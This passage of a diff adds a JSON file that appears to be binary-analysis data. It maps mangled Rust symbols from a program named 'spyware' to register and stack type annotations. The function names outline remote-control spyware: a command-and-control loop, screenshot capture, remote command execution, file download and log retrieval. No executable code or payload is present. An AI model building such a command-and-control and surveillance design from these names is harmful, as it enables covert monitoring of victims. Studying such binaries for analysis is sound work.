+      ]
+    },
+    "_ZN7spyware13communication8messages7Message15GetLogsResponse17hd97008268b60995eE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message20GetScreenshotRequest17h748c79272499737bE": {
+      "reg_rdi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages7Message21GetScreenshotResponse17h672420867e6f6ff4E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_xmm0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_xmm1": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_93_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Message$GT$9serialize17h581434390f64cc04E": {
+      "reg_edx": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_r8d": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware13communication8messages1_94_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Message$GT$11deserialize17h7721b036fb7eed9cE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware15run_server_loop17ha507d6dda312d1beE": {
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_104": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "&primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware23run_cnc_connection_loop17h099cfaaaff629944E": {
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_56": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_112": [
+        [
+          "array",
+          4
+        ]
+      ],
+      "stack_116": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_160": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_176": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_184": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_200": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_208": [
+        [
+          "array",
+          72
+        ]
+      ]
+    },
+    "_ZN7spyware12init_logging17h71d90daabdd6a317E": {
+      "reg_al": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          2
+        ]
+      ]
+    },
+    "_ZN7spyware4main17h0c167b4c5fedcce2E": {
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r9": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "array",
+          24
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_41": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_45": [
+        [
+          "primitive",
+          2
+        ]
+      ],
+      "stack_47": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_97": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_101": [
+        [
+          "primitive",
+          2
+        ]
+      ],
+      "stack_103": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_104": [
+        [
+          "array",
+          40
+        ]
+      ],
+      "stack_144": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_176": [
+        [
+          "array",
+          32
+        ]
+      ]
+    },
+    "_ZN7spyware7actions10basic_info19get_running_os_info17h2ac1d86b9171dd43E": {
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7actions10basic_info22get_basic_info_request17h37840dd4820167afE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          40
+        ]
+      ],
+      "stack_48": [
+        [
+          "array",
+          24
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          16
+        ]
+      ]
+    },
+    "_ZN7spyware7actions10basic_info21download_file_message17h8a802bf593e1dd2fE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r15": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_ebp": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "array",
+          4
+        ]
+      ],
+      "stack_100": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_136": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_144": [
+        [
+          "array",
+          56
+        ]
+      ]
+    },
+    "_ZN7spyware7actions11log_actions16get_logs_request17h84eb7739ff3a4934E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7logging4core12MemoryLogger6global17h99d7eb6ce0974984E": {
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7logging4core12MemoryLogger8get_logs17h68454e3110e201f1E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          48
+        ]
+      ]
+    },
+    "_ZN7spyware7logging4core13setup_logging17hadfb9a3c25f8d0fbE": {
+      "reg_rdi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r8": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r9": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_al": [
+        [
+          "primitive",
+          1
+        ],
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_136": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_144": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_152": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_160": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_168": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_176": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_192": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_200": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_216": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_248": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_264": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_280": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs9write_log17h24aec65a22a6ad29E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_r14": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_dl": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_bp": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN7spyware7logging13memory_logger18CircularMemoryLogs12get_all_logs17hfa3a03f9a722fe3cE": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rbx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          48
+        ]
+      ]
+    },
+    "_ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E": {
+      "reg_edi": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          24
+        ]
+      ],
+      "stack_32": [
+        [
+          "array",
+          24
+        ]
+      ]
+    },
+    "_ZN7spyware13communication13serialization17serialize_message17hd905e118d95099f9E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r15d": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          16
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_16": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "struct",
+          32
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          16
+        ]
+      ]
+    },
+    "_ZN7spyware7actions18screenshot_actions22get_screenshot_request17h77f87121c90614c4E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_32": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "struct",
+          16
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_128": [
+        [
+          "struct",
+          16
+        ]
+      ],
+      "stack_144": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_152": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_168": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_176": [
+        [
+          "struct",
+          16
+        ]
+      ],
+      "stack_192": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_200": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_208": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_248": [
+        [
+          "struct",
+          16
+        ]
+      ],
+      "stack_264": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_272": [
+        [
+          "struct",
+          16
+        ]
+      ],
+      "stack_288": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_320": [
+        [
+          "array",
+          72
+        ]
+      ]
+    },
+    "_ZN7spyware7actions8commands11run_command17ha7c0eb7cdcbdbc69E": {
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_48": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_64": [
+        [
+          "array",
+          56
+        ]
+      ]
+    },
+    "_ZN7spyware7actions8commands19run_command_message17h528f548903eb1e39E": {
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_r15": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_ebp": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_16": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_128": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_144": [
+        [
+          "primitive",
+          16
+        ]
+      ],
+      "stack_160": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    }
+  }
+}
